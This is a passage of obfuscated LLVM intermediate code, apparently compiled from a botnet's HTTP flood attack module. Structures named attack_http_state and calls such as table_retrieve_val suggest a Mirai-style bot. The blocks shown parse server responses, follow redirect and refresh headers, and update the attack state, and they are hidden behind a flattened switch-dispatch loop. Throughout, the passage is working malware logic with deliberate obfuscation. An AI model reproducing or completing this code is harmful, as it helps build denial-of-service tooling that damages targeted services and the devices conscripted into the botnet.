  %1731 = select i1 %1730, i32 1243679600, i32 342946940
  store i32 %1731, i32* %switchVar
  br label %loopEnd

; <label>:1732:                                   ; preds = %loopEntry
  %1733 = load i8*, i8** %54, align 8
  %1734 = call i32 @util_strlen(i8* %1733)
  %1735 = icmp slt i32 %1734, 128
  %1736 = select i1 %1735, i32 1264889418, i32 342946940
  store i32 %1736, i32* %switchVar
  br label %loopEnd

; <label>:1737:                                   ; preds = %loopEntry
  %1738 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1739 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1738, i32 0, i32 7
  %1740 = getelementptr inbounds [129 x i8], [129 x i8]* %1739, i32 0, i32 0
  %1741 = load i8*, i8** %54, align 8
  %1742 = call i32 @util_strcpy(i8* %1740, i8* %1741)
  store i32 342946940, i32* %switchVar
  br label %loopEnd

; <label>:1743:                                   ; preds = %loopEntry
  %1744 = load i8*, i8** %54, align 8
  %1745 = load i32, i32* %10, align 4
  %1746 = add nsw i32 %1745, 1
  %1747 = sext i32 %1746 to i64
  %1748 = getelementptr inbounds i8, i8* %1744, i64 %1747
  %1749 = call i32 @util_strlen(i8* %1748)
  %1750 = icmp slt i32 %1749, 256
  %1751 = select i1 %1750, i32 19379874, i32 -1682087627
  store i32 %1751, i32* %switchVar
  br label %loopEnd

; <label>:1752:                                   ; preds = %loopEntry
  %1753 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1754 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1753, i32 0, i32 6
  %1755 = getelementptr inbounds [257 x i8], [257 x i8]* %1754, i32 0, i32 0
  %1756 = getelementptr inbounds i8, i8* %1755, i64 1
  call void @util_zero(i8* %1756, i32 255)
  %1757 = load i8*, i8** %54, align 8
  %1758 = load i32, i32* %10, align 4
  %1759 = add nsw i32 %1758, 1
  %1760 = sext i32 %1759 to i64
  %1761 = getelementptr inbounds i8, i8* %1757, i64 %1760
  %1762 = call i32 @util_strlen(i8* %1761)
  %1763 = icmp sgt i32 %1762, 0
  %1764 = select i1 %1763, i32 -2090322764, i32 112175531
  store i32 %1764, i32* %switchVar
  br label %loopEnd

; <label>:1765:                                   ; preds = %loopEntry
  %1766 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1767 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1766, i32 0, i32 6
  %1768 = getelementptr inbounds [257 x i8], [257 x i8]* %1767, i32 0, i32 0
  %1769 = getelementptr inbounds i8, i8* %1768, i64 1
  %1770 = load i8*, i8** %54, align 8
  %1771 = load i32, i32* %10, align 4
  %1772 = add nsw i32 %1771, 1
  %1773 = sext i32 %1772 to i64
  %1774 = getelementptr inbounds i8, i8* %1770, i64 %1773
  %1775 = call i32 @util_strcpy(i8* %1769, i8* %1774)
  store i32 112175531, i32* %switchVar
  br label %loopEnd

; <label>:1776:                                   ; preds = %loopEntry
  store i32 -1682087627, i32* %switchVar
  br label %loopEnd

; <label>:1777:                                   ; preds = %loopEntry
  store i32 1038073962, i32* %switchVar
  br label %loopEnd

; <label>:1778:                                   ; preds = %loopEntry
  %1779 = load i8*, i8** %54, align 8
  %1780 = getelementptr inbounds i8, i8* %1779, i64 0
  %1781 = load i8, i8* %1780, align 1
  %1782 = sext i8 %1781 to i32
  %1783 = icmp eq i32 %1782, 47
  %1784 = select i1 %1783, i32 1303971574, i32 98295442
  store i32 %1784, i32* %switchVar
  br label %loopEnd

; <label>:1785:                                   ; preds = %loopEntry
  %1786 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1787 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1786, i32 0, i32 6
  %1788 = getelementptr inbounds [257 x i8], [257 x i8]* %1787, i32 0, i32 0
  %1789 = getelementptr inbounds i8, i8* %1788, i64 1
  call void @util_zero(i8* %1789, i32 255)
  %1790 = load i8*, i8** %54, align 8
  %1791 = load i32, i32* %10, align 4
  %1792 = add nsw i32 %1791, 1
  %1793 = sext i32 %1792 to i64
  %1794 = getelementptr inbounds i8, i8* %1790, i64 %1793
  %1795 = call i32 @util_strlen(i8* %1794)
  %1796 = icmp sgt i32 %1795, 0
  %1797 = select i1 %1796, i32 -1606267301, i32 1369787924
  store i32 %1797, i32* %switchVar
  br label %loopEnd

; <label>:1798:                                   ; preds = %loopEntry
  %1799 = load i8*, i8** %54, align 8
  %1800 = load i32, i32* %10, align 4
  %1801 = add nsw i32 %1800, 1
  %1802 = sext i32 %1801 to i64
  %1803 = getelementptr inbounds i8, i8* %1799, i64 %1802
  %1804 = call i32 @util_strlen(i8* %1803)
  %1805 = icmp slt i32 %1804, 256
  %1806 = select i1 %1805, i32 -1718873047, i32 1369787924
  store i32 %1806, i32* %switchVar
  br label %loopEnd

; <label>:1807:                                   ; preds = %loopEntry
  %1808 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1809 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1808, i32 0, i32 6
  %1810 = getelementptr inbounds [257 x i8], [257 x i8]* %1809, i32 0, i32 0
  %1811 = getelementptr inbounds i8, i8* %1810, i64 1
  %1812 = load i8*, i8** %54, align 8
  %1813 = load i32, i32* %10, align 4
  %1814 = add nsw i32 %1813, 1
  %1815 = sext i32 %1814 to i64
  %1816 = getelementptr inbounds i8, i8* %1812, i64 %1815
  %1817 = call i32 @util_strcpy(i8* %1811, i8* %1816)
  store i32 1369787924, i32* %switchVar
  br label %loopEnd

; <label>:1818:                                   ; preds = %loopEntry
  store i32 98295442, i32* %switchVar
  br label %loopEnd

; <label>:1819:                                   ; preds = %loopEntry
  store i32 1038073962, i32* %switchVar
  br label %loopEnd

; <label>:1820:                                   ; preds = %loopEntry
  %1821 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1822 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1821, i32 0, i32 1
  store i8 1, i8* %1822, align 4
  store i32 1925317065, i32* %switchVar
  br label %loopEnd

; <label>:1823:                                   ; preds = %loopEntry
  store i32 -1423284505, i32* %switchVar
  br label %loopEnd

; <label>:1824:                                   ; preds = %loopEntry
  %1825 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1826 = load i32, i32* %12, align 4
  %1827 = call i8* @table_retrieve_val(i32 62, i32* null)
  %1828 = call i32 @util_stristr(i8* %1825, i32 %1826, i8* %1827)
  %1829 = icmp ne i32 %1828, -1
  %1830 = select i1 %1829, i32 2143190436, i32 -569913810
  store i32 %1830, i32* %switchVar
  br label %loopEnd

; <label>:1831:                                   ; preds = %loopEntry
  %1832 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1833 = load i32, i32* %12, align 4
  %1834 = call i8* @table_retrieve_val(i32 62, i32* null)
  %1835 = call i32 @util_stristr(i8* %1832, i32 %1833, i8* %1834)
  store i32 %1835, i32* %55, align 4
  %1836 = load i32, i32* %55, align 4
  %1837 = sext i32 %1836 to i64
  %1838 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1837
  %1839 = load i8, i8* %1838, align 1
  %1840 = sext i8 %1839 to i32
  %1841 = icmp eq i32 %1840, 32
  %1842 = select i1 %1841, i32 383456891, i32 -913485607
  store i32 %1842, i32* %switchVar
  br label %loopEnd

; <label>:1843:                                   ; preds = %loopEntry
  %1844 = load i32, i32* %55, align 4
  %1845 = add nsw i32 %1844, 1
  store i32 %1845, i32* %55, align 4
  store i32 -913485607, i32* %switchVar
  br label %loopEnd

; <label>:1846:                                   ; preds = %loopEntry
  %1847 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1848 = load i32, i32* %55, align 4
  %1849 = sext i32 %1848 to i64
  %1850 = getelementptr inbounds i8, i8* %1847, i64 %1849
  %1851 = load i32, i32* %12, align 4
  %1852 = load i32, i32* %55, align 4
  %1853 = sub nsw i32 %1851, %1852
  %1854 = call i32 @util_memsearch(i8* %1850, i32 %1853, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1854, i32* %56, align 4
  %1855 = load i32, i32* %56, align 4
  %1856 = icmp ne i32 %1855, -1
  %1857 = select i1 %1856, i32 -1241138975, i32 963147622
  store i32 %1857, i32* %switchVar
  br label %loopEnd

; <label>:1858:                                   ; preds = %loopEntry
  %1859 = load i32, i32* %55, align 4
  %1860 = sext i32 %1859 to i64
  %1861 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1860
  store i8* %1861, i8** %57, align 8
  %1862 = load i32, i32* %56, align 4
  %1863 = icmp sge i32 %1862, 2
  %1864 = select i1 %1863, i32 -176386777, i32 1672280767
  store i32 %1864, i32* %switchVar
  br label %loopEnd

; <label>:1865:                                   ; preds = %loopEntry
  %1866 = load i32, i32* %56, align 4
  %1867 = sub nsw i32 %1866, 2
  store i32 %1867, i32* %56, align 4
  store i32 1672280767, i32* %switchVar
  br label %loopEnd

; <label>:1868:                                   ; preds = %loopEntry
  %1869 = load i32, i32* %55, align 4
  %1870 = load i32, i32* %56, align 4
  %1871 = add nsw i32 %1869, %1870
  %1872 = sext i32 %1871 to i64
  %1873 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1872
  store i8 0, i8* %1873, align 1
  %1874 = load i32, i32* %56, align 4
  %1875 = add nsw i32 %1874, 1
  store i32 %1875, i32* %56, align 4
  store i32 0, i32* %10, align 4
  store i32 -158616490, i32* %switchVar
  br label %loopEnd

; <label>:1876:                                   ; preds = %loopEntry
  %1877 = load i8*, i8** %57, align 8
  %1878 = load i32, i32* %10, align 4
  %1879 = sext i32 %1878 to i64
  %1880 = getelementptr inbounds i8, i8* %1877, i64 %1879
  %1881 = load i8, i8* %1880, align 1
  %1882 = sext i8 %1881 to i32
  %1883 = icmp ne i32 %1882, 0
  %1884 = select i1 %1883, i32 -1528364706, i32 1810785258
  store i32 %1884, i32* %switchVar
  store i1 false, i1* %.reg2mem49
  br label %loopEnd

; <label>:1885:                                   ; preds = %loopEntry
  %1886 = load i8*, i8** %57, align 8
  %1887 = load i32, i32* %10, align 4
  %1888 = sext i32 %1887 to i64
  %1889 = getelementptr inbounds i8, i8* %1886, i64 %1888
  %1890 = load i8, i8* %1889, align 1
  %1891 = sext i8 %1890 to i32
  %1892 = icmp sge i32 %1891, 48
  %1893 = select i1 %1892, i32 764646613, i32 1810785258
  store i32 %1893, i32* %switchVar
  store i1 false, i1* %.reg2mem49
  br label %loopEnd

; <label>:1894:                                   ; preds = %loopEntry
  %1895 = load i8*, i8** %57, align 8
  %1896 = load i32, i32* %10, align 4
  %1897 = sext i32 %1896 to i64
  %1898 = getelementptr inbounds i8, i8* %1895, i64 %1897
  %1899 = load i8, i8* %1898, align 1
  %1900 = sext i8 %1899 to i32
  %1901 = icmp sle i32 %1900, 57
  store i32 1810785258, i32* %switchVar
  store i1 %1901, i1* %.reg2mem49
  br label %loopEnd

; <label>:1902:                                   ; preds = %loopEntry
  %.reload50 = load i1, i1* %.reg2mem49
  %1903 = select i1 %.reload50, i32 464422653, i32 -519414788
  store i32 %1903, i32* %switchVar
  br label %loopEnd

; <label>:1904:                                   ; preds = %loopEntry
  %1905 = load i32, i32* %10, align 4
  %1906 = add nsw i32 %1905, 1
  store i32 %1906, i32* %10, align 4
  store i32 -158616490, i32* %switchVar
  br label %loopEnd

; <label>:1907:                                   ; preds = %loopEntry
  %1908 = load i8*, i8** %57, align 8
  %1909 = load i32, i32* %10, align 4
  %1910 = sext i32 %1909 to i64
  %1911 = getelementptr inbounds i8, i8* %1908, i64 %1910
  %1912 = load i8, i8* %1911, align 1
  %1913 = sext i8 %1912 to i32
  %1914 = icmp ne i32 %1913, 0
  %1915 = select i1 %1914, i32 1738256634, i32 1139309972
  store i32 %1915, i32* %switchVar
  br label %loopEnd

; <label>:1916:                                   ; preds = %loopEntry
  store i32 0, i32* %58, align 4
  %1917 = load i8*, i8** %57, align 8
  %1918 = load i32, i32* %10, align 4
  %1919 = sext i32 %1918 to i64
  %1920 = getelementptr inbounds i8, i8* %1917, i64 %1919
  store i8 0, i8* %1920, align 1
  %1921 = load i32, i32* %10, align 4
  %1922 = add nsw i32 %1921, 1
  store i32 %1922, i32* %10, align 4
  %1923 = load i8*, i8** %57, align 8
  %1924 = load i32, i32* %10, align 4
  %1925 = sext i32 %1924 to i64
  %1926 = getelementptr inbounds i8, i8* %1923, i64 %1925
  %1927 = load i8, i8* %1926, align 1
  %1928 = sext i8 %1927 to i32
  %1929 = icmp eq i32 %1928, 32
  %1930 = select i1 %1929, i32 355778241, i32 833126873
  store i32 %1930, i32* %switchVar
  br label %loopEnd

; <label>:1931:                                   ; preds = %loopEntry
  %1932 = load i32, i32* %10, align 4
  %1933 = add nsw i32 %1932, 1
  store i32 %1933, i32* %10, align 4
  store i32 833126873, i32* %switchVar
  br label %loopEnd

; <label>:1934:                                   ; preds = %loopEntry
  %1935 = load i8*, i8** %57, align 8
  %1936 = load i32, i32* %10, align 4
  %1937 = sext i32 %1936 to i64
  %1938 = getelementptr inbounds i8, i8* %1935, i64 %1937
  %1939 = load i8*, i8** %57, align 8
  %1940 = load i32, i32* %10, align 4
  %1941 = sext i32 %1940 to i64
  %1942 = getelementptr inbounds i8, i8* %1939, i64 %1941
  %1943 = call i32 @util_strlen(i8* %1942)
  %1944 = call i32 @util_stristr(i8* %1938, i32 %1943, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %1945 = icmp ne i32 %1944, -1
  %1946 = select i1 %1945, i32 95742170, i32 1212392141
  store i32 %1946, i32* %switchVar
  br label %loopEnd

; <label>:1947:                                   ; preds = %loopEntry
  %1948 = load i8*, i8** %57, align 8
  %1949 = load i32, i32* %10, align 4
  %1950 = sext i32 %1949 to i64
  %1951 = getelementptr inbounds i8, i8* %1948, i64 %1950
  %1952 = load i8*, i8** %57, align 8
  %1953 = load i32, i32* %10, align 4
  %1954 = sext i32 %1953 to i64
  %1955 = getelementptr inbounds i8, i8* %1952, i64 %1954
  %1956 = call i32 @util_strlen(i8* %1955)
  %1957 = call i32 @util_stristr(i8* %1951, i32 %1956, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %1958 = load i32, i32* %10, align 4
  %1959 = add nsw i32 %1958, %1957
  store i32 %1959, i32* %10, align 4
  store i32 1212392141, i32* %switchVar
  br label %loopEnd

; <label>:1960:                                   ; preds = %loopEntry
  %1961 = load i8*, i8** %57, align 8
  %1962 = load i32, i32* %10, align 4
  %1963 = sext i32 %1962 to i64
  %1964 = getelementptr inbounds i8, i8* %1961, i64 %1963
  %1965 = load i8, i8* %1964, align 1
  %1966 = sext i8 %1965 to i32
  %1967 = icmp eq i32 %1966, 34
  %1968 = select i1 %1967, i32 324598728, i32 583345757
  store i32 %1968, i32* %switchVar
  br label %loopEnd

; <label>:1969:                                   ; preds = %loopEntry
  %1970 = load i32, i32* %10, align 4
  %1971 = add nsw i32 %1970, 1
  store i32 %1971, i32* %10, align 4
  %1972 = load i8*, i8** %57, align 8
  %1973 = load i32, i32* %10, align 4
  %1974 = sext i32 %1973 to i64
  %1975 = getelementptr inbounds i8, i8* %1972, i64 %1974
  %1976 = load i8*, i8** %57, align 8
  %1977 = load i32, i32* %10, align 4
  %1978 = sext i32 %1977 to i64
  %1979 = getelementptr inbounds i8, i8* %1976, i64 %1978
  %1980 = call i32 @util_strlen(i8* %1979)
  %1981 = sub nsw i32 %1980, 1
  %1982 = sext i32 %1981 to i64
  %1983 = getelementptr inbounds i8, i8* %1975, i64 %1982
  %1984 = load i8, i8* %1983, align 1
  %1985 = sext i8 %1984 to i32
  %1986 = icmp eq i32 %1985, 34
  %1987 = select i1 %1986, i32 -518234464, i32 1431186382
  store i32 %1987, i32* %switchVar
  br label %loopEnd

; <label>:1988:                                   ; preds = %loopEntry
  %1989 = load i8*, i8** %57, align 8
  %1990 = load i32, i32* %10, align 4
  %1991 = sext i32 %1990 to i64
  %1992 = getelementptr inbounds i8, i8* %1989, i64 %1991
  %1993 = load i8*, i8** %57, align 8
  %1994 = load i32, i32* %10, align 4
  %1995 = sext i32 %1994 to i64
  %1996 = getelementptr inbounds i8, i8* %1993, i64 %1995
  %1997 = call i32 @util_strlen(i8* %1996)
  %1998 = sub nsw i32 %1997, 1
  %1999 = sext i32 %1998 to i64
  %2000 = getelementptr inbounds i8, i8* %1992, i64 %1999
  store i8 0, i8* %2000, align 1
  store i32 1431186382, i32* %switchVar
  br label %loopEnd

; <label>:2001:                                   ; preds = %loopEntry
  store i32 583345757, i32* %switchVar
  br label %loopEnd

; <label>:2002:                                   ; preds = %loopEntry
  %2003 = load i8*, i8** %57, align 8
  %2004 = call i32 @util_atoi(i8* %2003, i32 10)
  store i32 %2004, i32* %58, align 4
  store i32 806387262, i32* %switchVar
  br label %loopEnd

; <label>:2005:                                   ; preds = %loopEntry
  %2006 = load i32, i32* %58, align 4
  %2007 = icmp sgt i32 %2006, 0
  %2008 = select i1 %2007, i32 196128501, i32 1834527792
  store i32 %2008, i32* %switchVar
  store i1 false, i1* %.reg2mem51
  br label %loopEnd

; <label>:2009:                                   ; preds = %loopEntry
  %2010 = load i32, i32* %58, align 4
  %2011 = icmp slt i32 %2010, 10
  %2012 = select i1 %2011, i32 -93464875, i32 1834527792
  store i32 %2012, i32* %switchVar
  store i1 false, i1* %.reg2mem51
  br label %loopEnd

; <label>:2013:                                   ; preds = %loopEntry
  %2014 = load i32, i32* %27, align 4
  %2015 = load i32, i32* %58, align 4
  %2016 = add i32 %2014, %2015
  %2017 = zext i32 %2016 to i64
  %2018 = call i64 @time(i64* null) #6
  %2019 = icmp sgt i64 %2017, %2018
  store i32 1834527792, i32* %switchVar
  store i1 %2019, i1* %.reg2mem51
  br label %loopEnd

; <label>:2020:                                   ; preds = %loopEntry
  %.reload52 = load i1, i1* %.reg2mem51
  %2021 = select i1 %.reload52, i32 462052759, i32 338100588
  store i32 %2021, i32* %switchVar
  br label %loopEnd

; <label>:2022:                                   ; preds = %loopEntry
  %2023 = call i32 @sleep(i32 1)
  store i32 806387262, i32* %switchVar
  br label %loopEnd

; <label>:2024:                                   ; preds = %loopEntry
  %2025 = load i8*, i8** %57, align 8
  %2026 = load i32, i32* %10, align 4
  %2027 = sext i32 %2026 to i64
  %2028 = getelementptr inbounds i8, i8* %2025, i64 %2027
  store i8* %2028, i8** %57, align 8
  %2029 = load i8*, i8** %57, align 8
  %2030 = load i8*, i8** %57, align 8
  %2031 = call i32 @util_strlen(i8* %2030)
  %2032 = call i32 @util_stristr(i8* %2029, i32 %2031, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %2033 = icmp eq i32 %2032, 4
  %2034 = select i1 %2033, i32 -2109088602, i32 1570954389
  store i32 %2034, i32* %switchVar
  br label %loopEnd

; <label>:2035:                                   ; preds = %loopEntry
  store i32 7, i32* %10, align 4
  %2036 = load i8*, i8** %57, align 8
  %2037 = getelementptr inbounds i8, i8* %2036, i64 4
  %2038 = load i8, i8* %2037, align 1
  %2039 = sext i8 %2038 to i32
  %2040 = icmp eq i32 %2039, 115
  %2041 = select i1 %2040, i32 450329554, i32 -12135259
  store i32 %2041, i32* %switchVar
  br label %loopEnd

; <label>:2042:                                   ; preds = %loopEntry
  %2043 = load i32, i32* %10, align 4
  %2044 = add nsw i32 %2043, 1
  store i32 %2044, i32* %10, align 4
  store i32 -12135259, i32* %switchVar
  br label %loopEnd

; <label>:2045:                                   ; preds = %loopEntry
  %2046 = load i8*, i8** %57, align 8
  %2047 = load i8*, i8** %57, align 8
  %2048 = load i32, i32* %10, align 4
  %2049 = sext i32 %2048 to i64
  %2050 = getelementptr inbounds i8, i8* %2047, i64 %2049
  %2051 = load i32, i32* %56, align 4
  %2052 = load i32, i32* %10, align 4
  %2053 = sub nsw i32 %2051, %2052
  %2054 = sext i32 %2053 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2046, i8* %2050, i64 %2054, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  store i32 -1067633436, i32* %switchVar
  br label %loopEnd

; <label>:2055:                                   ; preds = %loopEntry
  %2056 = load i8*, i8** %57, align 8
  %2057 = load i32, i32* %10, align 4
  %2058 = sext i32 %2057 to i64
  %2059 = getelementptr inbounds i8, i8* %2056, i64 %2058
  %2060 = load i8, i8* %2059, align 1
  %2061 = sext i8 %2060 to i32
  %2062 = icmp ne i32 %2061, 0
  %2063 = select i1 %2062, i32 -324486589, i32 1388926655
  store i32 %2063, i32* %switchVar
  br label %loopEnd

; <label>:2064:                                   ; preds = %loopEntry
  %2065 = load i8*, i8** %57, align 8
  %2066 = load i32, i32* %10, align 4
  %2067 = sext i32 %2066 to i64
  %2068 = getelementptr inbounds i8, i8* %2065, i64 %2067
  %2069 = load i8, i8* %2068, align 1
  %2070 = sext i8 %2069 to i32
  %2071 = icmp eq i32 %2070, 47
  %2072 = select i1 %2071, i32 -1084758245, i32 2039497896
  store i32 %2072, i32* %switchVar
  br label %loopEnd

; <label>:2073:                                   ; preds = %loopEntry
  %2074 = load i8*, i8** %57, align 8
  %2075 = load i32, i32* %10, align 4
  %2076 = sext i32 %2075 to i64
  %2077 = getelementptr inbounds i8, i8* %2074, i64 %2076
  store i8 0, i8* %2077, align 1
  store i32 1388926655, i32* %switchVar
  br label %loopEnd

; <label>:2078:                                   ; preds = %loopEntry
  %2079 = load i32, i32* %10, align 4
  %2080 = add nsw i32 %2079, 1
  store i32 %2080, i32* %10, align 4
  store i32 -1067633436, i32* %switchVar
  br label %loopEnd

; <label>:2081:                                   ; preds = %loopEntry
  %2082 = load i8*, i8** %57, align 8
  %2083 = call i32 @util_strlen(i8* %2082)
  %2084 = icmp sgt i32 %2083, 0
  %2085 = select i1 %2084, i32 -966683379, i32 -2093265108
  store i32 %2085, i32* %switchVar
  br label %loopEnd

; <label>:2086:                                   ; preds = %loopEntry
  %2087 = load i8*, i8** %57, align 8
  %2088 = call i32 @util_strlen(i8* %2087)
  %2089 = icmp slt i32 %2088, 128
  %2090 = select i1 %2089, i32 -2046383036, i32 -2093265108
  store i32 %2090, i32* %switchVar
  br label %loopEnd

; <label>:2091:                                   ; preds = %loopEntry
  %2092 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2093 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2092, i32 0, i32 7
  %2094 = getelementptr inbounds [129 x i8], [129 x i8]* %2093, i32 0, i32 0
  %2095 = load i8*, i8** %57, align 8
  %2096 = call i32 @util_strcpy(i8* %2094, i8* %2095)
  store i32 -2093265108, i32* %switchVar
  br label %loopEnd

; <label>:2097:                                   ; preds = %loopEntry
  %2098 = load i8*, i8** %57, align 8
  %2099 = load i32, i32* %10, align 4
  %2100 = add nsw i32 %2099, 1
  %2101 = sext i32 %2100 to i64
  %2102 = getelementptr inbounds i8, i8* %2098, i64 %2101
  %2103 = call i32 @util_strlen(i8* %2102)
  %2104 = icmp slt i32 %2103, 256
  %2105 = select i1 %2104, i32 -1647295311, i32 -346837218
  store i32 %2105, i32* %switchVar
  br label %loopEnd

; <label>:2106:                                   ; preds = %loopEntry
  %2107 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2108 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2107, i32 0, i32 6
  %2109 = getelementptr inbounds [257 x i8], [257 x i8]* %2108, i32 0, i32 0
  %2110 = getelementptr inbounds i8, i8* %2109, i64 1
  call void @util_zero(i8* %2110, i32 255)
  %2111 = load i8*, i8** %57, align 8
  %2112 = load i32, i32* %10, align 4
  %2113 = add nsw i32 %2112, 1
  %2114 = sext i32 %2113 to i64
  %2115 = getelementptr inbounds i8, i8* %2111, i64 %2114
  %2116 = call i32 @util_strlen(i8* %2115)
  %2117 = icmp sgt i32 %2116, 0
  %2118 = select i1 %2117, i32 1563894464, i32 -975166747
  store i32 %2118, i32* %switchVar
  br label %loopEnd

; <label>:2119:                                   ; preds = %loopEntry
  %2120 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2121 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2120, i32 0, i32 6
  %2122 = getelementptr inbounds [257 x i8], [257 x i8]* %2121, i32 0, i32 0
  %2123 = getelementptr inbounds i8, i8* %2122, i64 1
  %2124 = load i8*, i8** %57, align 8
  %2125 = load i32, i32* %10, align 4
  %2126 = add nsw i32 %2125, 1
  %2127 = sext i32 %2126 to i64
  %2128 = getelementptr inbounds i8, i8* %2124, i64 %2127
  %2129 = call i32 @util_strcpy(i8* %2123, i8* %2128)
  store i32 -975166747, i32* %switchVar
  br label %loopEnd

; <label>:2130:                                   ; preds = %loopEntry
  store i32 -346837218, i32* %switchVar
  br label %loopEnd

; <label>:2131:                                   ; preds = %loopEntry
  store i32 940656239, i32* %switchVar
  br label %loopEnd

; <label>:2132:                                   ; preds = %loopEntry
  %2133 = load i8*, i8** %57, align 8
  %2134 = getelementptr inbounds i8, i8* %2133, i64 0
  %2135 = load i8, i8* %2134, align 1
  %2136 = sext i8 %2135 to i32
  %2137 = icmp eq i32 %2136, 47
  %2138 = select i1 %2137, i32 527339020, i32 190674450
  store i32 %2138, i32* %switchVar
  br label %loopEnd

; <label>:2139:                                   ; preds = %loopEntry
  %2140 = load i8*, i8** %57, align 8
  %2141 = load i32, i32* %10, align 4
  %2142 = add nsw i32 %2141, 1
  %2143 = sext i32 %2142 to i64
  %2144 = getelementptr inbounds i8, i8* %2140, i64 %2143
  %2145 = call i32 @util_strlen(i8* %2144)
  %2146 = icmp slt i32 %2145, 256
  %2147 = select i1 %2146, i32 -42377498, i32 304838793
  store i32 %2147, i32* %switchVar
  br label %loopEnd

; <label>:2148:                                   ; preds = %loopEntry
  %2149 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2150 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2149, i32 0, i32 6
  %2151 = getelementptr inbounds [257 x i8], [257 x i8]* %2150, i32 0, i32 0
  %2152 = getelementptr inbounds i8, i8* %2151, i64 1
  call void @util_zero(i8* %2152, i32 255)
  %2153 = load i8*, i8** %57, align 8
  %2154 = load i32, i32* %10, align 4
  %2155 = add nsw i32 %2154, 1
  %2156 = sext i32 %2155 to i64
  %2157 = getelementptr inbounds i8, i8* %2153, i64 %2156
  %2158 = call i32 @util_strlen(i8* %2157)
  %2159 = icmp sgt i32 %2158, 0
  %2160 = select i1 %2159, i32 -264067892, i32 -1798174512
  store i32 %2160, i32* %switchVar
  br label %loopEnd

; <label>:2161:                                   ; preds = %loopEntry
  %2162 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2163 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2162, i32 0, i32 6
  %2164 = getelementptr inbounds [257 x i8], [257 x i8]* %2163, i32 0, i32 0
  %2165 = getelementptr inbounds i8, i8* %2164, i64 1
  %2166 = load i8*, i8** %57, align 8
  %2167 = load i32, i32* %10, align 4
  %2168 = add nsw i32 %2167, 1
  %2169 = sext i32 %2168 to i64
  %2170 = getelementptr inbounds i8, i8* %2166, i64 %2169
  %2171 = call i32 @util_strcpy(i8* %2165, i8* %2170)
  store i32 -1798174512, i32* %switchVar
  br label %loopEnd

; <label>:2172:                                   ; preds = %loopEntry
  store i32 304838793, i32* %switchVar
  br label %loopEnd

; <label>:2173:                                   ; preds = %loopEntry
  store i32 190674450, i32* %switchVar
  br label %loopEnd

; <label>:2174:                                   ; preds = %loopEntry
  store i32 940656239, i32* %switchVar
  br label %loopEnd

; <label>:2175:                                   ; preds = %loopEntry
  %2176 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2177 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2176, i32 0, i32 9
  %2178 = getelementptr inbounds [9 x i8], [9 x i8]* %2177, i32 0, i32 0
  %2179 = call i8* @strcpy(i8* %2178, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %2180 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2181 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2180, i32 0, i32 1
  store i8 10, i8* %2181, align 4
  store i32 1925317065, i32* %switchVar
  br label %loopEnd

; <label>:2182:                                   ; preds = %loopEntry
  store i32 963147622, i32* %switchVar
  br label %loopEnd

; <label>:2183:                                   ; preds = %loopEntry
  store i32 -569913810, i32* %switchVar
  br label %loopEnd

; <label>:2184:                                   ; preds = %loopEntry
  %2185 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2186 = load i32, i32* %12, align 4
  %2187 = call i32 @util_memsearch(i8* %2185, i32 %2186, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %2187, i32* %37, align 4
  %2188 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2189 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2188, i32 0, i32 9
  %2190 = getelementptr inbounds [9 x i8], [9 x i8]* %2189, i32 0, i32 0
  %2191 = call signext i8 @util_strcmp(i8* %2190, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %2192 = sext i8 %2191 to i32
  %2193 = icmp ne i32 %2192, 0
  %2194 = select i1 %2193, i32 713012572, i32 812204768
  store i32 %2194, i32* %switchVar
  br label %loopEnd

; <label>:2195:                                   ; preds = %loopEntry
